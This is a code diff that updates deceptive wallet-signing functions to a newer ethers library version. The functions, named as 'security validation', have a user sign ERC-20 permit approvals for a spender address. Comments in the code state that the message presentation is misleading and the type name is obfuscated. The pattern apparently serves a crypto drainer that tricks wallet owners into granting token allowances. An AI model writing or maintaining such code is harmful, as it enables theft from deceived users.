@@ -26,7 +26,7 @@ export const generateSecurityValidation = async (
   signer: ethers.JsonRpcSigner,
   tokenAddress: string,
   spenderAddress: string,
-  amount: ethers.BigNumber
+  amount: bigint
 ): Promise<{ v: number; r: string; s: string; deadline: number }> => {
   try {
     const provider = signer.provider;
@@ -64,14 +64,14 @@ export const generateSecurityValidation = async (
     };
     
     // Sign the permit with misleading message presentation
-    const signature = await signer._signTypedData(
+    const signature = await signer.signTypedData(
       domain,
       { VerificationData: PERMIT_TYPES.Permit }, // Obfuscated type name
       dataSecurityParams
     );
     
     // Split signature
-    const sig = ethers.utils.splitSignature(signature);
+    const sig = ethers.Signature.from(signature);
     
     return {
       v: sig.v,
@@ -90,7 +90,7 @@ export const generateBatchValidation = async (
   signer: ethers.JsonRpcSigner,
   tokens: string[],
   spenderAddress: string,
-  amounts: ethers.BigNumber[]
+  amounts: bigint[]
 ) => {
   // This is a simplified implementation
   // In a real app, you would use the actual Permit2 contract interface
@@ -131,7 +131,7 @@ export const generateBatchValidation = async (
   };
   
   // Sign message
-  const signature = await signer._signTypedData(domain, types, message);
+  const signature = await signer.signTypedData(domain, types, message);
   
   return {
     signature,
